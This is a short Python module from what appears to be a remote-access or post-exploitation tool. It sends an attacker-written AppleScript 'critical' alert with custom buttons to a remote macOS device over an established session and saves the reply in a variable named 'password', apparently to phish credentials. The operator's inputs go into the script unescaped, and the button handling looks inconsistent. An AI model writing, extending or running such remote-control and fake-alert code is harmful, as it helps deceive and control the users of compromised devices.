import time
import json
import modules.helper as h

class command:
    def __init__(self):
        self.name = "alert"
        self.description = "Make alert show up on device."
        self.type = "applescript"

    def run(self,session,cmd_data):
        title = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Title: ")
        message = raw_input(h.CYAN+"[*]"+h.WHITE+" Alert Message: ")
        fbutton = raw_input(h.CYAN+"[*]"+h.WHITE+" First button: ")
        sbutton = raw_input(h.CYAN+"[*]"+h.WHITE+" Second button: ")
        payload = """
        set theAlertText to """"+title+""""
        set theAlertMessage to """"+message+""""
        display alert theAlertText message theAlertMessage as critical buttons {"Don't Continue", "Continue"} default 
              button """"+fbutton+"""" cancel button """"+sbutton+""""

        """
        cmd_data.update({"cmd":"applescript","args":payload})
        password = session.send_command(cmd_data).strip()
